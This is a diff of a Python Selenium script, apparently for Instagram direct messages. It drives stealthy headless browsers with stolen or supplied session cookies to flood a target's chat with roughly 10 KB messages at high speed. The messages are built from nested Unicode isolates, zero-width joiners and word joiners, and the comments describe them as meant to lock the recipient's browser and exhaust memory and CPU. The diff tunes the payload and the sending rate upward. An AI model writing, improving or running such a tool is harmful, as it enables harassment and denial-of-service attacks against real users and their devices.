@@ -1,41 +1,43 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (DIRECT-DISPATCH V49)
-# 📅 STATUS: UI-QUEUE-BYPASS | 4-AGENT TOTAL | AWS-CPU-STRIKE
+# 🚀 PROJECT: PRAVEER.OWNS (RECURSIVE-VOID V51)
+# 📅 STATUS: ATOMIC-UI-FREEZE | 4-AGENT TOTAL | AWS-CPU-MAX
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
 from selenium import webdriver
 from selenium_stealth import stealth
-from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.options import Options
 
 # --- 4 AGENTS TOTAL CONFIG ---
 AGENTS_PER_MACHINE = 2             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.2, 0.4)    
-REST_AFTER_STRIKES = 100   
-REST_DURATION = 5          
+BURST_SPEED = (0.05, 0.15)  # 🔥 High-Frequency Strike
+REST_AFTER_STRIKES = 150   
+REST_DURATION = 3          
 
 GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_dispatch_payload():
-    """Generates a high-authority visible payload designed for 32GB RAM saturation."""
-    u_id = random.randint(100, 999)
-    # \u2060 = Word Joiner | \u200D = ZWJ | \u2068 = Isolate
-    glue, zwj, iso, pop = "\u2060", "\u200D", "\u2068", "\u2069"
+def get_heavy_void_payload():
+    """Generates a recursive layout block that forces a Main-Thread lock."""
+    u_id = random.randint(1000, 9999)
+    # \u2068 = Isolate Start | \u2069 = Isolate Pop
+    # \u200D = ZWJ | \u2060 = Word Joiner
+    iso, pop, zwj, glue = "\u2068", "\u2069", "\u200D", "\u2060"
     
-    header = f"👑 PRAVEER PAPA ON TOP 🌙 [DISPATCH_ID:{u_id}]"
+    header = f"👑 PRAVEER PAPA ON TOP 🌙 [VOID_LOCK:{u_id}]"
     
     body = []
-    # 380 lines of unique, high-plane memory triggers
-    for i in range(380):
-        # Mixing 4-byte Fraktur and standard text to break memory compression
-        line = f"{iso}PRAVEER PAPA ON TOP 🌙 {zwj} 𝕻{i}{pop}{glue*12}"
+    # 410 lines - Hitting the absolute 10kb Instagram limit
+    for i in range(410):
+        # Nested isolates (3 deep) combined with ZWJ bonding
+        # This tells the browser: "This is a single character that is 3 levels deep."
+        # It forces the CPU into a recursive loop.
+        line = f"{iso}{iso}{iso}PRAVEER{zwj}PAPA{zwj}🌙{i}{pop*3}{glue*5}"
         body.append(line)
         
-    return f"{header}\n{glue.join(body)}".strip()[:9995]
+    return f"{header}\n{glue.join(body)}".strip()[:9998]
 
 def get_driver(agent_id):
     with BROWSER_LAUNCH_LOCK:
@@ -43,40 +45,34 @@ def get_driver(agent_id):
         chrome_options.add_argument("--headless=new") 
         chrome_options.add_argument("--no-sandbox") 
         chrome_options.add_argument("--disable-dev-shm-usage")
-        # 🛡️ THE FIX: Disable EVERYTHING that renders on your side
+        # 🛡️ Keep YOUR bot's CPU light by disabling all rendering
         chrome_options.add_argument("--disable-gpu")
         chrome_options.add_argument("--blink-settings=imagesEnabled=false")
-        
-        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
-        chrome_options.add_argument(f"user-agent={ua}")
         
         driver = webdriver.Chrome(options=chrome_options)
         stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
         return driver
 
-def direct_dispatch_send(driver, text):
-    """Bypasses the 'Typing' lag by using a Frame-Synchronized JS event."""
+def atomic_send(driver, text):
+    """Bypasses 'Typing' status by firing hardware-level dispatch events."""
     try:
         driver.execute_script("""
             var box = document.querySelector('div[role="textbox"], textarea');
             if (box) {
-                // Use requestAnimationFrame to ensure the CPU is 'ready' to send
-                window.requestAnimationFrame(() => {
-                    box.focus();
-                    document.execCommand('selectAll', false, null);
-                    document.execCommand('delete', false, null);
-                    document.execCommand('insertText', false, arguments[0]);
-                    
-                    // Trigger Internal Framework State
-                    box.dispatchEvent(new Event('input', { bubbles: true }));
-                    
-                    // Fire Native Keyboard Event
-                    var e = new KeyboardEvent('keydown', {
-                        key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
-                        bubbles: true, cancelable: true
-                    });
-                    box.dispatchEvent(e);
+                box.focus();
+                // 1. Clear previous attempts
+                document.execCommand('selectAll', false, null);
+                document.execCommand('delete', false, null);
+                // 2. Inject heavy payload
+                document.execCommand('insertText', false, arguments[0]);
+                // 3. Trigger framework state update
+                box.dispatchEvent(new Event('input', { bubbles: true }));
+                // 4. Force Enter dispatch
+                var e = new KeyboardEvent('keydown', {
+                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
+                    bubbles: true, cancelable: true
                 });
+                box.dispatchEvent(e);
             }
         """, text)
         return True
@@ -93,17 +89,17 @@ def run_life_cycle(agent_id, cookie, target):
             
             strike_count = 0
             while True:
-                payload = get_dispatch_payload()
-                if direct_dispatch_send(driver, payload):
+                payload = get_heavy_void_payload()
+                if atomic_send(driver, payload):
                     strike_count += 1
                     with COUNTER_LOCK:
                         global GLOBAL_SENT
                         GLOBAL_SENT += 1
-                    print(f"Agent {agent_id}: Dispatch-Strike ({GLOBAL_SENT})")
+                    print(f"Agent {agent_id}: Recursive-Strike ({GLOBAL_SENT})")
                     
-                    if strike_count % 60 == 0:
+                    if strike_count % 70 == 0:
                         driver.refresh()
-                        time.sleep(8)
+                        time.sleep(10)
                 
                 time.sleep(random.uniform(*BURST_SPEED))
         except: pass
